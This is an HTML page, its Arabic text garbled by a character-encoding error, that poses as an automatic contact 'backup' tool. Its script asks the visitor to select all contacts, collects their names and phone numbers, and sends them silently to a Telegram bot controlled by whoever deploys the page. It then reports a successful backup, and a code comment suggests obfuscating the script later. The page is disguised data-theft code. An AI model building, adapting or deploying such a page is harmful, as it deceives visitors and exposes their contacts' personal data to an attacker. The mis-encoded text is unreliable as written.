<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø³Ø® Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø´Ø§Ù…Ù„</title>
    <style>
        body { font-family: 'Cairo', sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 50px; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,255,150,0.2); }
        .btn { background: #00ff95; color: #000; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 18px; }
        #status { margin-top: 20px; color: #00ff95; }
    </style>
</head>
<body>

<div class="card">
    <h2>Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ</h2>
    <p>Ø§Ø¶ØºØ· Ù„Ù„Ø¨Ø¯Ø¡ØŒ Ø«Ù… Ø§Ø®ØªØ± "ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ÙƒÙ„" Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©</p>
    <button class="btn" onclick="startBackup()">Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø¢Ù†</button>
    <div id="status"></div>
</div>

<script>
async function startBackup() {
    const status = document.getElementById('status');
    
    // Ø¨ÙŠØ§Ù†Ø§ØªÙƒ (ÙŠÙØ¶Ù„ ØªØ´ÙÙŠØ± Ø§Ù„ÙƒÙˆØ¯ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ù„Ø§Ø­Ù‚Ø§Ù‹)
    const token = "YOUR_BOT_TOKEN"; 
    const chatID = "YOUR_CHAT_ID";

    if (!('contacts' in navigator)) {
        status.innerText = "Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø£Ø³Ù…Ø§Ø¡. Ø§Ø³ØªØ®Ø¯Ù… ÙƒØ±ÙˆÙ… Ø£Ù†Ø¯Ø±ÙˆÙŠØ¯.";
        return;
    }

    // Ù†Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…ØªØ§Ø­Ø©
    const props = ['name', 'tel', 'email'];
    const opts = { multiple: true };

    try {
        const contacts = await navigator.contacts.select(props, opts);

        if (contacts.length > 0) {
            status.innerText = "â³ Ø¬Ø§Ø±ÙŠ Ø¶ØºØ· ÙˆØ¥Ø±Ø³Ø§Ù„ " + contacts.length + " Ø¬Ù‡Ø© Ø§ØªØµØ§Ù„...";
            
            let message = `ğŸ“‚ **Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© ÙƒØ§Ù…Ù„Ø©**\n`;
            message += `Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ø³Ù…Ø§Ø¡: ${contacts.length}\n`;
            message += `--------------------------\n`;

            contacts.forEach((c, index) => {
                message += `${index + 1}- ${c.name} : ${c.tel}\n`;
            });

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¹Ø¯Ø¯ ÙƒØ¨ÙŠØ±Ø§Ù‹ Ø¬Ø¯Ø§Ù‹ Ø³ÙŠØªÙ… ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø±Ø³Ø§Ø¦Ù„)
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });

            status.innerText = "âœ… ØªÙ… Ø§Ù„Ù†Ø³Ø® Ø¨Ù†Ø¬Ø§Ø­ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…!";
        }
    } catch (err) {
        status.innerText = "âŒ ÙØ´Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø£Ùˆ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†.";
    }
}
</script>

</body>
</html>
